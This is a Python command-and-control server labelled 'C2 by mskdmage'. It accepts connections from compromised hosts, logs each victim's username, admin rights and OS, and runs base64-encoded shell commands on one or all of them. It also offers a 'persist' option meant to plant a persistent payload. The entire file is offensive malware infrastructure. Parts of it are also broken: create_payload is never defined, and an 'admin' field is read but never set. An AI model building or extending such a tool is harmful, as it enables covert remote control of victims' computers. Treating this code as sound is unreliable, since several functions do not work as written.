import socket
import threading
import base64
import time
import random
import string
import os
import os.path
import shutil
import subprocess
import sys
from datetime import datetime

class CommandServer:
    
    def __init__(self):
        self.server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.targets = []
        self.listeners = []
        self.current_target = None
        self.kill_flag = False

    def interactive(self):
        self.banner()
        self.help()
        while True:
            command = self.prompt("", prompt_type="input")
            command_args = command.split(" ")
            is_complex = len(command_args) > 1 
            if command_args[0] == "start":
                if is_complex:
                    host, port = command_args[1:3]
                else:
                    host = self.prompt("Provide the server host ip", prompt_type="input")
                    port = self.prompt("Provide the server port", prompt_type="input")
                try:
                    self.start_listener(host, int(port))
                except:
                    self.prompt(f"[ip={host}, port={port}] Invalid input", prompt_type="error")
            elif command_args[0] == "help":
                self.help()
            elif command_args[0] == "exit":
                self.command_broadcast("kill")
                sys.exit()
            elif command_args[0] == "broadcast":
                if is_complex:
                    subcommand = " ".join(command_args[1:])
                else:
                    subcommand = self.prompt("command to broadcast", prompt_type="input")
                self.command_broadcast(subcommand)
            
            elif command_args[0] == "session":
                if len(command_args) > 2:
                    try:
                        target = self.targets[int(command_args[1])]
                        subcommand = " ".join(command_args[2:])
                        self.handle_connection(subcommand, target)
                    except IndexError:
                        self.prompt(f"[{command_args[1]}] is not a valid index. Provide a valid index {range(len(self.targets))}.", prompt_type="error")
                else:
                    self.prompt(f"Provide a valid index and command [session [index] [command]]. Current range : {i for i in range(len(self.targets))}.", prompt_type="error")

            elif command_args[0] == "sessions":
                if len(self.targets) == 0:
                    self.prompt("No sessions", prompt_type="warning")
                else:
                    self.prompt("Listing all sessions")
                    for i, target in enumerate(self.targets):
                        print(f"(index: {i}) [{target.get('prompt')}] [ip: {target.get('ip')}] [admin: {target.get('admin')}] [date: {target.get('date')}]")
            else:
                self.prompt(f"[{command}] not found.", prompt_type="error")
                self.help()


    def start_listener(self, host_ip, host_port):
        self.server.bind((host_ip, int(host_port)))
        self.prompt("Awaiting for incoming connections...", prompt_type="wait")
        self.server.listen()
        new_thread = threading.Thread(target=self.stablish_connection)
        self.listeners.append(new_thread)
        new_thread.daemon = True
        new_thread.start()
        
    
    def stablish_connection(self):
        while True:
            if self.kill_flag == True:
                break
            try:
                new_target = {}
                target_connection, target_ip = self.server.accept()
                new_target.update({'connection' : target_connection, 'ip' : target_ip})
                username = self.receive_message(new_target)
                admin = self.receive_message(new_target)
                system = self.receive_message(new_target)
                host_name = socket.gethostbyaddr(target_ip[0])[0]
                current_time = time.strftime("%H:%M:%S", time.localtime())
                date = datetime.now()
                date_record = f"{date.year}/{date.month}/{date.day} - {current_time}"
                new_target.update({
                    'username' : username,
                    'prompt' : f"{username}@{host_name}" if host_name else f"{username}@{target_ip[0]}",
                    'is_admin' : username == 'root',
                    'is_windows' : 'Windows' in system,
                    'date' : date_record,
                    'is_active' : True
                    })
                self.targets.append(new_target)
                self.prompt(f"Connection stablished {new_target.get('prompt')}", prompt_type="success")
            except Exception as e:
                self.prompt(e, "error")
        self.command_broadcast("kill")
        
    def handle_connection(self, command, target):
        while True:
            if len(command) == 0:
                continue
            if command == "kill":
                self.send_message(command, target)
                target.get("connection").close()
                target.update({"is_active" : False})
                break
            elif command == "background":
                break
            elif command == "persist":
                self.create_payload()
                break
            else:
                self.send_message(command, target)
                response = self.receive_message(target)
                if response == "exit":
                    self.prompt(f"The client {target.get('prompt')} has terminated the session.", prompt_type="error")
                    target.get('connection').close()
                    target.update({'is_active' : False})
                    break
                self.prompt(f"{target.get('prompt')} ", prompt_type="response")
                print(response)
                break
    
    def command_broadcast(self, command):
        self.prompt("Broadcasting...", prompt_type="warning")
        for target in self.targets:
            self.handle_connection(command, target)

    def send_message(self, content, target):
        target.get("connection").send(self.encode(content))

    def receive_message(self, target, bit_length=4096):
        content = target.get("connection").recv(bit_length)
        return self.decode(content)

    def encode(self, content):
        message = base64.b64encode(bytes(str(content), encoding="utf8"))
        return message
    
    def decode(self, content):
        message = base64.b64decode(content.decode()).decode()
        return message
    
    def prompt(self, content, prompt_type="default"):
        if prompt_type == "input":
            val = input(f"( ? ) {content} ▷ ")
            return val
        else:
            output = ""
            if prompt_type == "default":
                output = f"( + ) {content} ◁ "
            elif prompt_type == "warning":
                output = f"( ! ) {content} ◁ "
            elif prompt_type == "response":
                output = f"( ☆ ) {content} ▽ "
            elif prompt_type == "error":
                output = f"( ✘ ) {content} ◁ "
            elif prompt_type == "wait":
                output = f"( ⏲ ) {content} ◁ "
            elif prompt_type == "success":
                output = f"( ✔ ) {content} ◁ "
            elif prompt_type == "false_input":
                output = f"( ? ) {content} ▷ "
            else:
                output = f"( - ) {content} ◁ "
            print(output)
    
    def banner(self):
        print("_____________________________________________________")
        print()
        print("         ┏┓             ┓  ┏┓    ┓┓                  ")
        print("         ┃ ┏┓┏┳┓┏┳┓┏┓┏┓┏┫  ┗┓┏┓┏┓┃┃                  ")
        print("         ┗┛┗┛┛┗┗┛┗┗┗┻┛┗┗┻  ┗┛┣┛┗ ┗┗   C2 by mskdmage.")
        print("                             ┛                       ")
        print("_____________________________________________________")

    def help(self):
        print("\nCommandServer Usage:")
        print("--------------------------------------------------")
        print("\tstart - Start the command server listener.")
        print("\tkill [index]- Terminate active sessions.")   
        print("\tbroadcast [command] - Send a command to all active sessions.")
        print("\tsessions - List all active sessions.")
        print("\texit - Exit the command server.")
        print("--------------------------------------------------")
        print("Commands to use after connecting to a session:")
        print("\tkill - Terminate the current session.")
        print("\tbackground - Put the current session in the background.")
        print("\tpersist - Create a persistent payload on the target.")
        print("--------------------------------------------------")

def main():
    kill_flag = False
    server = CommandServer()
    server.start_listener(sys.argv[1], sys.argv[2])
    server.interactive()

if __name__ == "__main__":
    main()
